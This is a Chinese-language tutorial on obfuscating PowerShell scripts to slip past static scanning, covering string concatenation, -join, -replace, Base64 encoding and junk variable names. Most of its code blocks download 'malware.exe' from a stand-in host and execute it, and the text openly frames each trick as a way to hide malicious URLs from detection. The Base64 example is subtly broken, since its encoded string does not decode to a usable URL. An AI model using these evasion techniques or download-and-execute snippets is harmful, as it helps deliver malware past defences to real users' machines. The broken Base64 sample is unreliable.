## 拼接，混淆代码
### 利用+号拼接字符串
```
$part1 = "http://"
$part2 = "malicious"
$part3 = ".com/malware.exe"
$url = $part1 + $part2 + $part3
Invoke-WebRequest -Uri $url -OutFile "C:\Temp\malware.exe"
Start-Process "C:\Temp\malware.exe"
```
这段代码将恶意 URL 的各部分字符串拼接在一起，避免了在静态扫描中直接检测到恶意 URL。`Invoke-WebRequest` 用于从该 URL 下载文件并保存为 `malware.exe`，然后通过 `Start-Process` 执行该文件。

可以将URL，命令进行拼接，注意ps脚本中字符串用引号引起来

### 使用-join操作符拼接字符串
`-join` 操作符用于将一个数组或集合中的所有元素连接成一个单一的字符串，元素之间可以用指定的分隔符连接。这个操作符常用于将字符或字符串数组合并成一个完整的字符串。
```
$array = @('Hello', 'world', 'this', 'is', 'PowerShell')
$joinedString = $array -join ' '  # 使用空格作为分隔符
Write-Output $joinedString
```
输出
```
Hello world this is PowerShell
```
在这个示例中，我们定义了一个字符串数组 `$array`，其中包含多个单词。使用 `-join` 操作符将数组中的元素通过空格连接成一个单一的字符串，最后输出合并后的字符串 `"Hello world this is PowerShell"`。

-join ‘  ’ 后面单引号中表示的是使用什么作为空格符。join是将一个数组中的所有元素都链接起来，并且使用同一种分隔符链接起来。

### -replace操作符进行替换字符串
`-replace` 是一个非常强大的字符串替换操作符，它允许使用正则表达式对字符串进行匹配和替换。这个操作符的语法是：`string -replace 'pattern', 'replacement'`，其中 `'pattern'` 是被替换的字符串，`'replacement'` 是替换的内容。
```
$string = "The quick brown fox"
$newString = $string -replace "brown", "black"
Write-Output $newString
```
输出
```
The quick black fox
```
注意-replace操作符是将字符串中的只要是和被替换字符相同的全部替换掉。

### 使用base64编码
```
$encodedString = "aW52b2tlLXdlYj0iaHR0cDovL21hbGljaW91c3MuY29tL21hbHdhcmUuZXhlIg=="  # Base64 编码的字符串
$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedString))
Invoke-WebRequest -Uri $decodedString -OutFile "C:\Temp\malware.exe"
Start-Process "C:\Temp\malware.exe"
```
通过 `Base64` 编码隐藏恶意 URL。通过 `[System.Convert]::FromBase64String` 进行解码，然后利用 `Invoke-WebRequest` 下载恶意文件。此方式绕过了对恶意链接的静态分析。
注意这个写法，要先对编码完成的字符串赋值变量，在对其解码并赋值变量。

### 混淆变量和函数名称
```
$____1 = "http://"
$____2 = "malicious"
$____3 = ".com/malware.exe"
$____url = $____1 + $____2 + $____3
$____cmd = "Invoke-WebRequest"
$____file = "C:\Temp\malware.exe"

& $____cmd -Uri $____url -OutFile $____file
Start-Process $____file
```
通过使用多下划线和无意义的名称来混淆函数和变量名。`Invoke-WebRequest` 用于下载恶意文件并保存为 `malware.exe`，然后执行该文件。混淆使得脚本分析变得困难。本质上就是对变量加多下划线。

